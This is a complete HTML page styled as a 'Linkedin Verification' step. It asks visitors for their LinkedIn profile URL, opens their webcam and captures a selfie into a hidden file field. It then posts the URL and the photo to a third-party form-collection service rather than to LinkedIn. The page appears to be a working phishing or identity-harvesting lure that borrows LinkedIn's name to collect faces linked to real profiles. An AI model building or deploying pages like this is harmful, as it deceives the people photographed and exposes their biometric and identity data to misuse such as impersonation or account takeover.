<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Face Verification</title>

<style>

body{
font-family:Arial;
background:#0f172a;
color:white;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.card{
background:#020617;
padding:25px;
border-radius:16px;
width:360px;
text-align:center;
}

input{
width:100%;
margin:10px 0;
padding:10px;
border-radius:8px;
border:none;
}

button{
padding:12px;
margin-top:10px;
width:100%;
border:none;
border-radius:10px;
background:#2563eb;
color:white;
font-size:16px;
cursor:pointer;
}

.camera{
position:relative;
}

video{
width:100%;
border-radius:12px;
}

.circle{
position:absolute;
width:180px;
height:180px;
border:3px dashed #22c55e;
border-radius:50%;
top:50%;
left:50%;
transform:translate(-50%,-50%);
pointer-events:none;
}

</style>

</head>

<body>

<div class="card">

<h3>Linkedin Verification</h3>

<form
action="https://usebasin.com/f/4180b06c3b35"
method="POST"
enctype="multipart/form-data"
>

<input
type="url"
name="linkedin"
placeholder="LinkedIn profile URL"
required
>

<div class="camera">

<video
id="video"
autoplay
playsinline
></video>

<div class="circle"></div>

</div>

<button
type="button"
onclick="capturePhoto()"
>
Take Photo
</button>

<input
type="file"
name="selfie"
id="photoInput"
accept="image/*"
required
style="visibility: hidden !important;">

<button type="submit">
Submit
</button>

</form>

</div>

<script>

const video =
document.getElementById("video")

navigator.mediaDevices
.getUserMedia({video:true})
.then(stream=>{
video.srcObject = stream
})

function capturePhoto(){

const canvas =
document.createElement("canvas")

canvas.width =
video.videoWidth

canvas.height =
video.videoHeight

const ctx =
canvas.getContext("2d")

ctx.drawImage(video,0,0)

canvas.toBlob(blob=>{

const file =
new File(
[blob],
"selfie.jpg",
{type:"image/jpeg"}
)

const container =
new DataTransfer()

container.items.add(file)

document
.getElementById("photoInput")
.files =
container.files

alert("Photo captured")

})

}

</script>

</body>
</html>
